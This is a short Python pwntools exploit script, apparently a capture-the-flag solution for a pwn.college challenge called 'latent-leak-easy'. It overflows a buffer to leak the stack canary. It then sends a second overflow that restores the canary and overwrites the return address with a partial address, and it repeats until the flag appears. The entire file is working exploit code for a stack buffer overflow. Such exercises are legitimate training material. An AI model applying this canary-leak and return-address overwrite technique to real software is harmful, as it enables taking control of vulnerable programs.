from pwn import *


while True:
    p = process('/challenge/latent-leak-easy')

    p.recvuntil('Payload size:')
    p.sendline(b'57')

    payload = b'REPEAT' + b'a' * 51

    #p.recvline('Send your payload')
    p.sendline(payload)

    p.recvuntil('You said: ')
    str = p.recvuntil('This challenge')
    print(str)
    canary = bytearray()
    canary.append(0)
    for i in range(57,64):
        canary.append(str[i])

    print(canary)
    #p.recvuntil('Payload size:')
    p.sendline(b'346')
    payload =  b'a' * 328 + canary + b'a' * 8 + p16(0x1eef)
    p.recvuntil('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    print(str)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
